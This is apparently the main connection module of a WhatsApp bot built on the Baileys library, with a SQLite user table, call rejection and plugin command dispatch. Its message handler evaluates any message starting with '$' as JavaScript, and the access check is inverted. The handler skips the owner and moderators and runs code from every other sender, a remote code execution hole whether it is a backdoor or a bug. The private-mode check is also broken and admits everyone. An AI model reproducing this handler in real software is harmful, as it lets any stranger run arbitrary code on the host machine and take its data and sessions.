const { default: makeWASocket, Browsers, useMultiFileAuthState, makeCacheableSignalKeyStore, DisconnectReason } = require('baileys');
const pino = require('pino');
const path = require('path');
const { exec } = require('child_process');
const util = require('util');
const config = require('../config.js');
const fs = require('fs');
const serialize = require('./serialize');
const { loadPlugins } = require('./plugins');
const { Sequelize, DataTypes } = require('sequelize');

const sequelize = new Sequelize({
    dialect: 'sqlite',
    storage: path.join(__dirname, 'database.db'),
    logging: false,
});
const User = sequelize.define('User', {
    jid: {
        type: DataTypes.STRING,
        primaryKey: true
    },
    name: DataTypes.STRING,
    isAdmin: DataTypes.BOOLEAN
});

const connect = async () => {
    try {
        await sequelize.authenticate();
        await sequelize.sync();
        console.log('sync db');
        console.log('✅ DB connected');
    } catch (e) {
        console.error(e);
        return;
    }
    const sessionDir = path.join(__dirname, 'Session');
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);
    const logga = pino({ level: 'silent' });
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const conn = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, logga)
        },
        browser: Browsers.macOS("Chrome"),
        logger: pino({ level: 'silent' }),
        downloadHistory: false,
        syncFullHistory: false,
        markOnlineOnConnect: false,
        getMessage: false,
        emitOwnEvents: false,
        generateHighQualityLinkPreview: true
    });

    let plugins = [];

    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            console.log('✅ Garfield connected');
            plugins = await loadPlugins();
        }
        if (connection === 'close') {
            console.log(lastDisconnect?.error);
            setTimeout(connect, 3000);
        }
    });

    conn.ev.on('creds.update', saveCreds);

    conn.ev.on('call', async (call) => {
        for (const c of call) {
            if (c.isOffer) {
                try {
                    const callerJid = c.from;
                    await conn.rejectCall(c.callId, callerJid);
                    await conn.sendMessage(callerJid, {
                        text: 'Sorry, I do not accept calls',
                    });
                } catch {}
            }
        }
    });

    conn.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify' || !messages || !messages.length) return;
    const msg = messages[0];
    if (!msg.message) return;
    if (!plugins.length) return;

    const message = await serialize(msg, conn);
    if (!message || !message.body) return;

    console.log(`\nUser: ${message.sender}\nMessage: ${message.body}\nFrom: ${message.from}\n`);
    await User.findOrCreate({
        where: { jid: message.sender },
        defaults: {
            name: message.pushName || '',
            isAdmin: false
        }
    });

    if (message.body?.startsWith('$')) {
    if (message.fromMe || message.sender.split('@')[0] === config.owner || config.mods.includes(message.sender.split('@')[0])) return;
    let code = message.body.slice(1).trim();
    let result = await eval(`(async () => { ${code} })()`);
    await message.send(String(result)); }
    const cmdEvent =
        config.WORK_TYPE === 'public' ||
        (config.WORK_TYPE === 'private' && (message.fromMe || config.mods));
    if (!cmdEvent) return;

    const control = config.prefix || process.env.PREFIX;
    if (message.body.startsWith(control)) {
        const [cmd, ...args] = message.body.slice(control.length).trim().split(' ');
        const match = args.join(' ');
        const found = plugins.find(p => p.command === cmd);
        if (found) {
            await found.exec(message, match);
            return;
        }
    }

    for (const plugin of plugins) {
        if (plugin.on === "text" && message.body) {
            await plugin.exec(message);
        }
    }
  });
};

module.exports = { connect };
